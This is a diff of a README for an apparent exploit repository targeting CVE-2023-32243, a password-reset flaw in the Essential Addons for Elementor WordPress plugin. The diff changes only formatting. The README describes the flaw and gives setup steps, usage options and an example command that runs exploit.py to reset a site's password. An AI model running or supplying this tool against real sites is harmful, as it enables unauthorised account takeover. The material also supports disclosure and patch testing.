@@ -1,13 +1,10 @@
 # CVE-2023-32243.
 Essential Addons for Elementor 5.4.0-5.7.1 - Unauthenticated Privilege Escalation
 
-Info
----
-The plugin does not validate the password reset key, which could allow unauthenticated attackers to reset arbitrary account's password to anything they want, by knowing the related email or username, gaining access to them
+### Info
+The plugin does not validate the password reset key, which could allow unauthenticated attackers to reset arbitrary account's password to anything they want, by knowing the related email or username, gaining access to them.
 
-Python Setup
-----
-
+- Python Setup
 ```
 pip install -r requirements.txt
 ```
@@ -18,9 +15,7 @@ Exploit Details
 
 https://patchstack.com/articles/critical-privilege-escalation-in-essential-addons-for-elementor-plugin-affecting-1-million-sites/
 
-Usage
-----
-
+- Usage
 ```
 usage: exploit.py [-h] -u URL -p PASSWORD [-usr USERNAME]
 
@@ -33,8 +28,7 @@ options:
                         Username of the user to reset if you already know it.
  ```
 
-Example
-----
+- Example
 
 ```
 python3 exploit.py --url http://wordpress.lan  --password "adminadmin2"
